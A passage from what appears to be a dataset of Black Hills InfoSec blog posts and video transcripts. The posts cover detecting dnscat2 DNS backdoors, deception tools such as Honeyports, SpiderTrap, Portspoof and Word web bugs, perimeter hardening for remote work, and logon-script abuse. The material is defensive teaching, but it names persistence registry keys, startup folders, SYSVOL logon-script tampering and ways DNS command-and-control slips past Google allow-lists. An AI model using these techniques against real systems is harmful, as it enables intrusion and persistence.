DNS, the best thing to think of is a phone book. A very large, automatic phone book that your computer uses to resolve names like www.yahoo.com or Google or Active Countermeasures or Security Weekly, whatever it is you're going to. \n\nYour computer has no idea what those things are. None, what's so ever. So it has to resolve that to a number or an IP address. Now, whenever we're looking at those IP addresses, another analogy is it's like a phone number right, it's like a number that you would call to get to a computer. Now the analogy falls apart after a while, but just suffice to say that the analogy of name to a number with a phonebook in the middle works. \n\nNow, whenever you have a backdoor, it can actually use DNS as that covert command and control getting out of the environment.\n\nOne of the tools that works very well for doing this is DNScat2 by Ron Bowes, and that's in fact what you're seeing here. Now in this example, you can see that the number of subdomains are 23,362 or hosts associated with nanobotninjas. That's not normal. That's like, if you think of google.com, right? You have maps.google.com, mail.google.com, you have drive.google.com those are all subdomains or hosts associated with the domain google.com. Now in order for the DNS backdoor to work, it needs to make a full connection for every single DNS lookup. The reason why is if it just did www.nanobotninjas.com again and again, then the local DNS resolver, which in many organizations is there domain controller, would just serve up that cached answer. So it has to set up a randomized request every single time. \n\nI'll show you what that looks like here. Here you can see that we have 23,362 subdomain requests that's just, that's bad. \n\nAll right so what we're going to do is we're going to drop into the directory in bro where we'll do some quick bro log analysis for DNS backdoors.\n\nNow you can see our evil domain is nanobotninjas.com and you can see that the file that we are looking at is DNScat_log/2017-03-21. That's exactly the directory that we're logged into, so we're going right to the source.\n\nSo RITA said something is weird here so what we're doing now is we're actually diving into it a little bit deeper. What I'm going to use is a tool called zgrep. Zgrep allows me to grep out a string inside of compressed archives. DNScat was going to have a whole bunch of DNS queries, we're going to see that in a second but it's currently all logged inside of bro data and that bro data is compressed. So instead of going through and trying to decompress absolutely everything, you can see here is a whole bunch of different compressed files and there's a lot of DNS files there, what we're going to do instead, is we're going to use a tool that can grep up out of those compressed archives anything or any line that has the string nanobot, specifically looking at any file with DNS in the name. \n\nI'm going to hit enter, here we go. \n\nNow a couple of things that are going to jump out at you fairly quickly. First, for a lot of people that are new to this, this looks like total complete and utter gibberish. That's ok. What I want you to notice is here. You can see that we have multiple requests for cat.nanobotninjas.com but if you look, you can actually see that the string before the cat actually is randomized for every single request. That's because a DNS backdoor is going to have to randomize that request to cause the full DNS query to go all the way to the evil DNS circuit and back every single time. So there's lots of requests that are being made. \n\nThe other thing that's interesting about this, is if you look, the DNS server that it's talking to is 8.8 8.8. Now, there are a couple of interesting things. First, this is interesting because it is Google's DNS server. That's kind of weird. Does this mean that Google's DNS server is evil? It just means that Google's DNS server is receiving that request and then it's forwarding that request to the nanobotninjas name server. So it's kind of forwarding that. \n\nNow the reason why this is important to anyone who does enterprise security is because many of your organization's whitelist everything that goes to Google. Whether it's www.google.com or 8.8.8.8, it just ignores it. And it does that for the purposes of resource utilization, monitoring network traffic on the edge of your network, it's just easier to say, \"Ah, that's going to Google, eh, let it go!\" and just let it run without actually stopping it at all.\n\nSo this is important for two separate reasons. One it's important because this backdoor is heavily utilized by Black Hills Information Security in our pentests, or variations of this particular backdoor. Two, it doesn't really get caught all that much. And three, we have found that many organizations that are security products themselves are actually ignoring a lot of the traffic that happens to be relaying through something like Google. \n\nAnd you're going to see this a lot more as we progress throughout these videos for things like domain fronting as well.\n\nSo once again, my name is John Strand if you have an opportunity to go down and hit subscribe, I see a lot of people that are YouTubers, I think that's right? They say to do that all the time so I guess I'm going to do it, too? And also, please check us out every Wednesday on Enterprise Security Weekly where we aren't afraid to name vendors, name names and actually say how well things do or sometimes do not work. Thank you so much and I hope to see you in the next video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Messing With Portscans With Honeyports (Cyber Deception)\"\nTaxonomies: \"Author, How-To, InfoSec 101, John Strand, Red Team, Red Team Tools, Cyber Deception, honeyports, john strand\"\nCreation Date: \"Fri, 20 Mar 2020 16:00:21 +0000\"\n\nhttps://youtu.be/hMLStJuNUT0\n\nHello and welcome! My name is John Strand, and in this video, we're going to be talking about tripwire Honeyports. Now, this is a lab that's used in ADHD. This is the virtual machine that we use in my classes that we teach at Wild West Hackin' Fest and also at Black Hat. But in this video, we're going to be talking about how you can create a port on your computer system that as soon as an adversary interacts with that port it will automatically blacklist the IP address of said attacker.\n\nNow in this particular situation, as always, all of the usage information is in this file on the desktop called ADHDusage.HTML. We're using Annoyance, and specifically, we're looking at HoneyPorts. Now, as I mentioned, the HoneyPort is designed so that if an adversary actually interacts with a specific port, it's automatically going to blacklist the attacker's IP address. \n\nNow, it's very common for people to freak out about this and say, \"Well, an attacker can simply spoof a connection and then it would blacklist and DOS your entire environment.\" \n\nThat's not at all how that works. It's not how any of this works. That's just insane. Let me explain why.\n\nIf you're looking at TCP/IP. The TCP/IP three-way handshake involves me sending you a SYN packet. All right? I'm going to send you a SYN packet, and if that port's open, you're going to respond back with the SYN-ACK. \n\nNow, there's these things called initial sequence numbers that are 32 bits long. Now what that means is there's 4.27 billion and change possible values for that. Now, I send you a SYN with an initial sequence number, you acknowledge that initial sequence number by incrementing it by one, and then you start another sequence number. Then I acknowledge that sequence number by one, and then we communicate yet again through a series of ACKs. \n\nWhat does this mean?\n\nThis means if an attacker was going to try to spoof a live system, they would have to spoof that system and they would have to guess a 32-bit number on the fly before that system that they're spoofing responds back with a reset. \n\nPoint is, it's really hard to do. Not impossible, it's just mathematically improbable to do because this particular scenario with Honeyports, they only trigger in a full established connection to the port.\n\nSo let's get started. Once again, we're following the instructions on ADHD. I'm going to be using the terminal for this as always. I'm going to CD into the OPT directory, once again following the instructions right there. Let me zoom in. \n\nWe're going to CD into opt/honeyports/cross-platform. This is the one written by Paul Asadoorian of Security Weekly. Then, once we are in Honeyports, we're actually going to run the version 04a.py. So we got python2, and we're going to do ./honeyports, and we do dot version 4.a.py, and we hit enter. \n\nNow as soon as I hit enter, it's going to throw an error. \n\nSpecifically, it's asking for a port. Now the cool thing about this is it means that Honeyports in the script that Paul created is flexible. We can create any port that we want for it to actually listen. So if I hit up arrow, I'm going to give it the port 2222. Once again, totally not creative. We've got to give it the minus P. There we are, and now it's listening on port 2222.\n\nI also made another mistake. Once again, so, so many mistakes, you all. \n\nI'm going to kill this again, and I'm going to run it as root. \n\nThe reason why is what Honeyports does is as soon as somebody makes a connection, it is going to create a rule in IP tables. In order to create a rule in IP tables, one must be root. \n\nSo now I'm running Sudu. We got python2, honeyports.py. We have the port. Let's connect to it. I'm going to open up another terminal, and I'm going to simply netcat to port 2222. Go to 127.0.0.1 and port 2222. I hit enter. It says, \"Thank you for connecting.\" \n\nNow if I kill this, and I try to connect again, you can see it doesn't work. This connection is dead. That is because this system now is blacklisted, so if I become root really quickly, quick as unto a bunny and/or a gazelle, and I do IP tables, become root. Oh, I am already root.\n\nLet's go IP tables minus L. It's going to list out the IP table rules, and if we check the input chain right here, you can see that localhost.com, as soon as localhost.com tries to make a connection to this computer system, it's going to reject with an ICMP port unreachable message, which is just a fun way to switch protocols and mess with... Look, it's TCP/IP humor. At least I think it's funny. \n\nBut it's going to basically redirect and drop any traffic coming from that particular computer system. We can also see over here within HoneyPorts that it did create the rule. We can do P and it'll print the rules, and we can ultimately kill them and we can actually flush the rules as well. We do IP tables minus F, and it's going to flush any of the rules that were created. Now if I list them, you see there are no input rules anymore, so we deleted that specific rule.\n\nNow once again, I really want to reiterate that this will not break your environment. An attacker's not going to show up and start spoofing ports from our IP addresses from everywhere and crash your entire network. That's not how this works because of the magic of the TCP/IP three-way handshake. \n\nBut some people will say, \"But what about Kevin Mitnick and Tsutomu Shimomura?\" Great question. With Kevin Mitnick and his attack years ago, you should really research it at the Takedown website. What Kevin Mitnick did was this attack against a weak protocol that was wide open to the network, and it was a weak sequence number prediction, and he was able to DOS the system he was trying to spoof. Gets into a lot of weirdness about that specific scenario, but just suffice to say something that happened in the '90s is not going to happen on your network, at least more than likely, we hope.\n\nOnce again, please check out Wild West Hackin' Fest, Black Hills Information Security, and ActiveCountermeasures.com, and also check out Enterprise Security Weekly with Paul, myself, and Matt every single Wednesday. Thank you so much, and we'll see you in the next video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Check Your Perimeter\"\nTaxonomies: \"Author, David Fletcher, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, David Fletcher\"\nCreation Date: \"Mon, 23 Mar 2020 12:05:00 +0000\"\nDavid Fletcher //\n\nWith so many organizations transitioning to remote work in order to stem the tide of COVID-19 infections, we wanted to cover some of the configuration elements you should be considering to ensure that your network perimeter is properly protected. Employee remote access is often a target for attackers looking to gain initial access into an organization\u2019s network. With authenticated remote access, an attacker may be able to run roughshod through your environment in a very short time.\n\nMulti-Factor Authentication\n\nAs employees are transitioned to work from home, it is critical to ensure that your organization is using Multi-Factor Authentication (MFA) on all Internet-facing portals leading to corporate information. In the 2019 Verizon Data Breach Investigation Report (DBIR), use of stolen credentials was the number one hacking technique observed.\n\nAttackers often use tools to gather employee names, mangle those results into usernames, and perform attacks like password spraying against exposed portals in order to gain access. Without MFA, an attacker just needs to guess a correct password and access is obtained. Since the number of remote workers is typically increasing due to the spread of COVID-19, the attack surface is also increasing which is likely to increase the overall risk of NOT using MFA. \n\nIn addition, you should not just be concerned with the obvious portals. Dig into your vulnerability scan results and investigate anything requesting external authentication. Especially if those hosts and applications are requesting NTLM over HTTP authentication. We are often successful in gaining access using applications other than Webmail and VPN.\n\nMFA is not a silver bullet given that many transparent proxies (like CredSniper and Evilginx) exist. But it will increase the work factor for an attacker to gain access to your environment. Improved security can be gained by requiring client certificates on connecting devices. However, if you are not doing this already, it may be difficult to implement securely in an expedited fashion.\n\nHygiene\n\nExternal hygiene is on everyone\u2019s radar. However, there have been a rash of vulnerabilities discovered in VPN and other remote access technologies that should be checked.\n\nMany of the recently discovered vulnerabilities require very little sophistication and no credentials to exploit. To make matters worse, the exposed devices are typically missing security controls that are deployed to all of our workstations (like antivirus and endpoint threat detection). In addition, increased utilization is likely to make detection using log files generated by the devices difficult, at best.\n\nWhen scanning these devices, ensure that appropriate checks are enabled to detect the known flaws. You may also be able to use one of the publicly published vulnerability scanning or exploitation scripts to perform a targeted check for vulnerable conditions. Just make sure that you get the script from a reputable source and that you understand what the script is doing. Often, the scripts simply make HTTP requests for resources exposed by the appliance. \n\nVPN Configuration\n\nIKE Aggressive Mode\n\nThe configuration of your VPN concentrator is another important aspect of security. We often see the age-old \u201cIKE Aggressive Mode with Pre-Shared Key (PSK)\u201d vulnerability on external penetration tests. The aggressive mode IKE handshake exposes enough information to attempt to recover the Pre-Shared Key (PSK) used to protect the VPN tunnel. To avoid this situation, the VPN device can be configured to accept only main mode handshakes. A main mode handshake does not disclose the same details that can be used to recover the PSK.\n\nIn reality, this can be a difficult condition to exploit because the attacker typically needs to know the group name for the connection. Once the PSK is cracked, the attacker may have to deal with inner authentication as well. This may provide an additional opportunity for password attacks. In any case, it is a good idea to address this configuration element.\n\nSplit-Tunneling\n\nAnother VPN configuration item that can pose problems is allowing split-tunneling. A split-tunnel is formed when the employee is allowed to openly browse the Internet, bypassing the VPN connection, while connected to the VPN. Only requests for corporate resources traverse the VPN itself. \n\nThis is excellent for bandwidth conservation but completely bypasses the infrastructure used to enforce corporate IT policy (like web proxies, execution sandboxes, SSL/TLS inspection devices, full packet capture devices, etc). Allowing split-tunneling can make the investigation of an intrusion more difficult, if not impossible. Now responders must consider traffic that is not traversing the corporate network and are likely to have reduced visibility on the employee\u2019s network.\n\nOrganizations should seriously consider their security posture, the inherent costs, and implications of the configuration before allowing split tunneling.\n\nOn the bright side, there are various cloud-based protections that can help mitigate this risk, if you are a subscriber. Technologies like Cisco Umbrella and Zscaler provide some of the capabilities afforded by Internal infrastructure regardless of the device\u2019s path to the Internet.\n\nCorporate Wireless Configuration\n\nWhat does your corporate wireless configuration have to do with remote security? As noted above, the use of stolen credentials is number one on the hacking activity list. Your corporate wireless configuration could be another way to obtain credentials for employees.\n\nYour wireless network infrastructure affords at least some protection while in the office. Some equipment also may have active protection to prevent various attacks. An attacker often needs to transmit a signal that is more powerful than a legitimate access point in order to execute an evil twin attack. \n\nIn the evil twin attack, the attacker advertises an identical SSID in hopes to entice devices to connect to it. When those devices use Active Directory domain authentication, the attacker AP challenges for credentials and the computer sends those credentials automatically. Connections usually require no user interaction since the attacker is advertising what appears to be a known network. The affected device simply connects when the SSID is observed.\n\nA problem arises when corporate equipment (and other devices using domain authentication) is away from the corporate infrastructure. Now, the attacker has an advantage in that there is no legitimate signal to compete with or actively prevent client connections from occurring.\n\nAs a result, organizations should ensure that wireless networks are configured to perform mutual authentication between the client and the infrastructure. This means that the client should be validating the certificate of the AP and vice-versa. \n\nIn addition, keep an eye on those mobile devices. In several organizations that we have tested, the organization has a mobile network segment but is using Active Directory authentication to minimize the number of credentials the user must remember. Without deploying client certificates to these devices, an attacker can intercept credentials from them as well.\n\nOnce the attacker has credentials, they can try to use them on Internet-facing portals or they may physically steal a device where they can legitimately authenticate from.\n\nHome Network Protections\n\nOne last concern to consider is the separation of employees' home and work lives. Modern home networks are often teeming with IoT devices, smartphones, and gaming consoles. The organization often cannot attest to the security of these devices or the network itself. \n\nThe best option is likely to be the most difficult to implement, in that the organization should ensure that corporate devices are segmented from personal devices on the employee\u2019s network. We will be covering this topic in an upcoming blog post in detail.\n\nA more palatable alternative may be to deploy an always-on VPN configuration to corporate devices. The employee would be allowed to authenticate using cached credentials, then join the wireless network, and the VPN client connects automatically anytime the network is accessed.\n\nThis limits the exposure of the device while connected to the employee\u2019s home network and prevents local interaction while connected through the tunnel.\n\nConclusion\n\nAs organizations are taking measures to respond to COVID-19, it is important to do so in a manner that does not increase exposure to the business.  Ensuring that remote access is securely configured is an important consideration before allowing remote operations in mass. Hopefully, this post will help identify areas to check as your business becomes more distributed. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Messing With Web Attackers With SpiderTrap (Cyber Deception)\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, John Strand, Cyber Deception, spidertrap\"\nCreation Date: \"Mon, 30 Mar 2020 12:11:00 +0000\"\n\nhttps://youtu.be/2G6cG8g7p04\n\nHello and welcome! My name is John Strand. In this video, we're going to be talking about using SpiderTrap to entrap and ensnare any web application pentesters or hackers that are trying to come into your web applications. \n\nNow, for this particular video, we're going to be using the Active Defense Harbinger Distribution, or ADHD, which can be found at activecountermeasures.com, go forward slash into projects and you'll be able to download the same distribution that I'm using here. This is also the same distribution that we use in our Wild West Hackin' Fest classes. You can look at that schedule at www.wildwesthackinfest.com. I also use it at Black Hat Training as well.\n\nSo let's jump right in.\n\nNow, as it is always with any of the different utilities that we use for ADHD, all of the instructions are on the desktop in a file called ADHD Usage. We'll be using that file for everything. Now, once you're in here, you're going to be using the annoyance category. You're going to be selecting SpiderTrap. Once you have selected SpiderTrap, it's going to bring up a website that's going to show you where you can actually download SpiderTrap, a generalized description, and usage information for SpiderTrap.\n\nNow, I'm going to walk through these instructions very, very quickly to give you an idea of how this tool actually works. Now, the first thing that I'm going to do is I'm just going to start SpiderTrap with no options at all. Here, I'm just running Python to SpiderTrap.py. I hit enter and it's listening. That's it. It's listening on port 8,000. Now, to see what it actually does, we're going to open up a browser and let's just surf to port 8,000 on my computer system. We go HTTP://, and we are going to go to port 8,000 on 127.0.0.1 because there's no place like home.\n\nNow, once we have this, you're going to see that as soon as we load SpiderTrap on port 8,000, it's going to show us a series of random links. Now, those random links are somewhat important. The reason why those links are important is because if we click on any of those links, it's going to bring us more random links and yet more random links and more random links and yet more random links. \n\nNow, what exactly is this doing and why is this important? \n\nWhen you're looking at cyber attribution or you're looking at cyber deception, one of the key components of what we can do is sort of fake the adversary or the hacker out.\n\nNow, the reason why is if we're looking at a basic algorithm of detection time plus reaction time must be less than the amount of time it takes for an attacker to break into your organization, we want to increase the amount of time it takes for the attacker to successfully identify any systems or vulnerabilities on those computer systems. By creating a bunch of different randomized links, we're not stopping the attacker, but we are actually going through and increasing the work effort the attacker has to go through to identify the real web server pages on your web server.\n\nWhat does this look like to an actual attacker or crawler? Here, I'm just going to use Wget. Now, Wget is a tool that if I use the -R, it recursively goes to a webpage and it'll try to pull down and make a local copy of all the different HTML and JavaScript files that exist on that web server. As you can see, it just keeps going and going and going, still going, going, going, going. Then, I'm bored and I'm just going to hit control save. \n\nNow, eventually, if an attacker was running an automated crawling tool, it would exhaust all of the memory or it would exhaust all of the disc space on the computer system.\n\nNow, what I'm going to do is I'm going to throw in another option with SpiderTrap. SpiderTrap also has the ability to take in a dictionary file. Now, a dictionary file allows you to feed in a list of different directory names instead of it coming up with randomized directories. Now, if I run it with big.txt and ADHD, now we have real names, Cheryl, really, Nebraska, issue, SMS, Toyota, skins. If I click on any one of these, it brings up tomcat, send mail, ask, primerio, registered. We've got sparky, we've got cobra, we've got terrorism, we have poker, we have projects, whatever. This makes the fake web server look a little bit more realistic and, yes, it'll still get caught in an automated crawling spider. \n\nNow, is SpiderTrap something that you would want to do on an enterprise app? Not even close, not even close. \n\nIs it great for articulating the different things you can do to mess with an attacker? Absolutely. It's really, really good at that. \n\nAlso, you can use it tactically. If you think that you have an attacker that's trying to break into your website, you can throw this up on robots.txt. You can put it in sitemap.xml. These are things that normal users would never come across, but their automated utilities would.\n\nI hope you enjoyed this video and I'll see you in the next video. As always, be sure to check out Wild West Hackin' Fest, Black Hills Information Security, and Security Weekly every Wednesday with Matt Alderman, Paul Asadoorian, and myself where we talk vendors and what works and what doesn't. Thank you so much and I'll see you in the next video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Use Portspoof (Cyber Deception)\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, InfoSec 101, John Strand\"\nCreation Date: \"Wed, 08 Apr 2020 12:20:00 +0000\"\n\nhttps://youtu.be/SrCPwpyt0AE\n\nHello and welcome, and in this video, we're going to be talking a little bit about Portspoof, a fantastic utility that takes your unused TCP/IP ports and turns them into something different whenever an attacker actually goes about trying to scan them. This video is part of the Active Defense and Cyber Deception class that we run at Wild West Hackin' Fest in San Diego and in Deadwood and also I run in Black Hat.\n\nNow as always, with all of these videos, we're going to be using the Active Defense Harbinger Distribution. Once again, if you want this distribution, you go to activecountermeasures.com, you go into the free tools, you'll see ADHD listed there. You can download the VM and play along. All of the instructions are on the ADHD usage document on the desktop. \n\nNow to get to the instructions for using Portspoof, we're going to go to Annoyance. We're going to go down into Portspoof, which I went right by it. Here we go. We're going to select Portspoof. Let me zoom back out and it's going to have a wonderful little website that you can go to get more information about Portspoof, an overall description of Portspoof and what we're actually doing.\n\nNow let's get started, and the first thing we're going to have to do is play around with iptables rules. Now the way Portspoof works is it listens on a port, in this situation that's going to be listening on port 4444, and we're going to create an iptables firewall that takes all of the traffic that's coming in a port or a port range. As you can see here, we have matches TCP as the protocol and then it's going to match the destination port. And then this situation, the range between one and 65,535 and it's going to redirect it to the local system on port 4444.\n\nNow what Portspoof is going to do is receive those connections initially and it's going to say that every single port that is scanned is open, and then we're going to change it so it actually goes with a variety of different services. \n\nSo if we were to look at my system now and how it looks in a scan, if I run my Nmap scan, give it a port one to 10 I'm only going to run 10 ports in this video and you'll see why. But Portspoof can greatly increase the amount of time it takes for a successful port scan. \n\nWe're going to go with ports one through 10 against my Linux IP address and it comes back with all of those ports currently closed. Now, why does it think that those ports are closed? Well, one of the things I can do is I can add in the dash dash reason flag and with the dash dash reason flag, we are seeing that the connection itself is refused.\n\nThere's a number of reasons why you might not get a response from a system. You could get a reset, you could get no response whatsoever. You could get an ICM port unreachable. There's a wide variety of reasons and with the dash dash reason flag, Nmap's going to tell us why it thought those ports were closed.\n\nWell now let's go configure Portspoof. \n\nSo I'm going to use the wonderful power of copy and paste and just so you know, copy and paste is without question the single most powerful tool that any hacker or pentester or security professional has. I'm going to become root and I'm going to paste in that long string for iptables. I'm going to hit enter. We have now created that iptables rule on this system. Now to get the initial working Portspoof, the only thing I have to do is just run Portspoof.\n\nNow it's running. \n\nSo now if I go back to my system, that's \"running the attack\" over here, you can see that initially all of the ports were closed. Now all of those ports are open and the reason why it states that those ports are open is because it received a SYN/ACK and Portspoof is sending those SYN/ACKs.\n\nNow this in and of itself is not all that interesting. It's just basically saying yep, SYN/ACK, ports open. But with Portspoof, we can actually do something a little bit more interesting with Portspoof. You see, what we can do with Portspoof is we can actually give it a signature file on the system. So I'm going to copy that string with a signature file, I'm going to paste in Portspoof. Now Portspoof is running and it's saying using user-defined signature file at user local Etsy Portspoof signatures.\n\nNow, what does it mean to have a signature file? \n\nWell, a variety of different services will respond with a variety of different banners. For example, if you connect to an SSH server, it might come back and say open SSH in the specific version. You might identify a web server by its banner. It says it's an Apache webserver or whatever. We can use those signatures, and to be honest, Nmap uses those signatures to adequately identify what the remote application is on the other side. So now if we run an actual scan against it, we're now going to do Nmap space -AF, but we're going to do a version scan and what that version scan is going to do is, it's going to attempt to identify what those versions of the different services are on the system. \n\nNow it's going to take a little bit longer and the reason why it takes a little bit longer is because Nmap isn't just seeing if the port is open, it's actually interrogating that service and it's trying to identify exactly what that banner is.\n\nSo there's a lot of stimulus and response that's going back and forth between my system here and the system we are now currently scanning. If you want to see status, you can just hit the space bar and it's going to come back and it's going to say, well about 70% done, one's completed and here are the results. \n\nNow, if you look at this point, Portspoof is now completely messed with us because it's saying that port 1 is open, the service is Telnet, and it believes that it's a Tanberg NPS, 800 Telnet D server. It thinks that port 4 is Webtam, Webtrends, WTAM. We've got a Tobit David.fx, IMAP D server. We have a Sunbelt server? \n\nWhat is this madness? What is this insanity? \n\nWell, if we were to run this again, it's going to take a little while.\n\nPortspoof is taking these signatures from the signature file and it's feeding it right back into Nmap and it's actually taking a random signature from that signature file and feeding it into Nmap. \n\nNow inevitably you're going to have someone say, well, of course, an attacker will be able to see right through this. Yes, I mean it's going to create a lot of noise for the attacker, but that's kind of the point. \n\nRemember, detection time plus reaction time must be less than the amount of time it takes for an attacker to successfully attack your network. So now we have greatly increased the amount of time it takes for an attacker to run a simple port scan against the target computer system. That's interesting, in and of itself, it's just going to increase that time. 10 ports. It took 32 seconds to scan 10 ports. If we were trying to scan all 65,535 ports that were referenced in our iptables rules, it's going to take a lot longer to identify all those services in ports.\n\nNow if you wanted to find a real service that was alive and listening, you would have to run it multiple times and see which ones looked more consistent with what you would expect. And you can also do a manual inspection. If you think it's a webserver port, just connect to it. But once again, this is greatly increasing the amount of work effort that an attacker has to go through to identify your ports and your services. So this is a fantastic little utility that's built into the Active Defense Harbinger Distribution. We use for our Wild West Hackin' classes for cyber deception. \n\nAnd if this is interesting, coming up, we've got an entire two-day class dedicated to all of this that you should be running.\n\nSo once again, my name is John Strand. Please check out Enterprise Security Weekly every Wednesday where Paul Asadoorian and Matt and myself get together and we talk about vendors. Thank you so much and I will see you in the next video.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Tracking Attackers With Word Web Bugs (Cyber Deception)\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, InfoSec 101, John Strand, Cyber Deception, Word Web Bugs\"\nCreation Date: \"Mon, 13 Apr 2020 12:10:00 +0000\"\n\nhttps://youtu.be/yZtm7yZAm7o\n\nHello and welcome! My name is John Strand, and in this video, we're going to be talking about Word Web Bug Servers. Now the idea of a Word Web Bug Server is we can create a Word document that any time that document is opened it will actually create a call back and it will allow us to identify where the attacker's IP address is. \n\nNow the cool thing about Word Web Bugs is they don't need to have macros enabled for them to fire. In fact, they don't necessarily even have to open Microsoft Word at all. \n\nNO MACROS!NO M$ WORD!\n\nSo, let's actually go through how a Word Web Bug document works. Now in this particular video, we're using the Active Defense Harbinger Distribution. This is the distribution I use for my class on cyber deception at Wild West Hackin' Fest, both in San Diego and in Deadwood, South Dakota, and I also use it for whenever I teach that class at BlackHat, the four-day version of that class.\n\nNow the instructions are on the ADHD usage document on the desktop of the system. And then once you're in, you can select attribution, and then you can select Web Bug Server and it'll take you to step by step instructions on how to use the Web Bug Server. \n\nLet's actually jump right in here. \n\nSo to get this to work, everything is in the opt directory. So I'm going to CD into opt, into web bug server and I'm going to type LS. Now in this directory, there's a number of different things that exist. The first thing that you're going to notice is we have a number of document templates. We have web_bug.doc and we have web_bug.html. \n\nNow the thing that you need to understand is that both of these are pretty much the same. And I'll explain why here in just a couple of seconds.\n\nSo if I do ifconfig and I pull down my IP address, you're going to see that my ens33 adapter has an IP address of 192.168.149.128. So I'm going to copy that IP address because we're going to use that here in just a second. Then I'm going to use VI and I'm going to open up web_bug.doc. \n\nNow if you look inside of web_bug.doc, web_bug.doc actually has HTML code, which is weird because it's a doc file. \n\nNow in this particular example, if you were to open up this document in Word, you wouldn't see the HTML, HTML and the head and the link URL. You wouldn't see that. Instead, what you would see is just a document that's blank and it would say \"what a buggy document\" and that's it.\n\nInstead, what's happening in the background is really interesting because what's happening in the background is the word processor, in this situation, Microsoft Word or AbiWord or whatever is going to try to pull down some HTML elements. It's going to try to pull down a cascading style sheet. \n\nThe other thing that it's going to do is try to pull down an image source tag. So if you're working with ADHD, you're going to take the default IP addresses in this document and you're going to replace them with the IP address of your computer system. Now if we start, let's say AbiWord and we open up web_bug.doc, it says it can't open this appears to be an invalid document. Huh? That's weird. But it doesn't matter if it says, \"Hey, this is an error\" or not because in the background what's going on is really interesting. \n\nSo I'm going to show you the database in the backend and ADHD has Abminer as the backend database. So we're going to log in with a user ID of webbuguser and we're going to log in with a password of, I think it's webbug or ADHD, can't remember what it is, ADHD and then webbug for the database.\n\nThere we go. \n\nBy the way, you should never ever use this in production like ever. \n\nAnd you're going to see requests and if I select requests, it's going to open up the actual data. And here you can see a bunch of examples that I've already pre-populated. You can say LibreOffice opened and we got the IP address. We also had Microsoft Word from an earlier run on a Windows 10 computer system, was making a connection back as you can see this user agent string. And then right down here at the bottom is not necessarily the user agent string, but it's my AbiWord attempt at opening this. And if you remember AbiWord threw an error, but in this particular scenario, who cares because the document already did a call back to us as the defenders. \n\nNow the key for this is it actually runs in multiple different ways.\n\nIt will use image source tag and cascading style sheet. The reason why is some word processors do better with image source tags and others do better with cascading style sheets. \n\nSo I hope you had a good time in this video. Be sure to check out the links below, and I don't do this much in my videos, but I'm going to say hit that subscribe button because other YouTubers do it and they seem to be really popular with the middle school kids. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Backdoors & Breaches: Logon Scripts\"\nTaxonomies: \"Author, David Fletcher, Fun & Games, Informational, InfoSec 101, Red Team, Backdoors & Breaches, David Fletcher\"\nCreation Date: \"Mon, 06 Apr 2020 12:15:00 +0000\"\nDavid Fletcher //\n\nThis blog post discusses the relevance and techniques involved in logon script abuse. While the Backdoors & Breaches card is featured for this topic, the post will provide context for understanding how an attacker can abuse this functionality and details that are useful in monitoring for such abuses.\n\nOperating systems typically have features that allow an administrator or user to automatically execute commands during session initiation to ease the burden of administration in the context of a given environment. An attacker can take advantage of those features to execute commands of their own in order to gain initial access, establish persistence, or perform lateral movement.\n\nThis type of attack can be most devastating in the context of a corporate Active Directory environment. As a result, the discussion will center around the Microsoft Windows operating system. However, administrators and security analysts should realize that many of the capabilities we will be investigating are available in other operating systems and those vendor appliances installed on our networks.\n\nIn the context of this post, I consider a \u201cLogon Script\u201d any functionality that supports automated command execution during user session initialization. So, what techniques might an attacker try to obtain authentication-based execution?\n\nModification of registry keys\n\nLocal filesystem-based automated execution\n\nDefault domain logon script modification\n\nGroup policy modification\n\nUser object attribute modification\n\nThis surely is not an exhaustive list. However, it includes techniques that are most widely known and some things that we have encountered on recent engagements. Let's explore each technique individually to more comprehensively understand it.\n\nModification of Registry Keys\n\nThis technique is age-old and highly instrumented by Antivirus and Endpoint Detection and Response tools. The Microsoft Windows registry contains several keys that can be used to execute content when the user logs onto the target host. The most widely discussed keys include:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\n\nIn fact, there are many other options for execution and a comprehensive treatment can be found at https://attack.mitre.org/techniques/T1060/.\n\nIf an attacker is able to successfully modify one of the referenced keys successfully, the system will execute the target application each time the user authenticates.  \n\nAs an organization, it would be a wise investment to ensure that your chosen endpoint protection software identifies modification of the referenced registry keys to prevent abuse. In addition, it would be prudent to monitor for new registry keys used for this type of abuse.\n\nLocal Filesystem-based Automated Execution\n\nWhen an attacker gains a \u201clogon script\u201d type automated execution using the local filesystem, the typical attack vector is the user or system\u2019s startup folder. \n\nC:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\nBy default, the system startup folder is not writable by standard users. However, some organizations still grant local administrative permissions to their user populations. \n\nIn any case, your chosen endpoint protection software should identify when these folders are modified. The contents of the folder should be monitored and investigated when changes do occur.\n\nDefault Domain Logon Script Modification\n\nProbably the most widely understood \u201cLogon Script\u201d functionality is the use of scripts found in the \\\\\\SYSVOL\\Scripts share or an equivalent Group Policy Object that defines the Logon/Logoff script policy element.\n\nAn attacker can easily discover the target logon script by inspecting the Active Directory scriptPath attribute of user objects. \n\nIn addition, the attacker can search the \\\\\\SYSVOL\\policies share for the presence of the Logon folder. \n\nOnce the target scripts are discovered, the attacker can check those locations for the ability to write to the files. If write access is allowed, the attacker can use the script to attack anyone to which the logon script has been prescribed. Where write access is not allowed, the attacker can trace execution to determine whether additional scripts or binaries are called by the initial script and evaluate NTFS permissions in those locations.\n\nAs a result, the organization must periodically ensure that NTFS permissions set on domain login scripts and any branching locations are 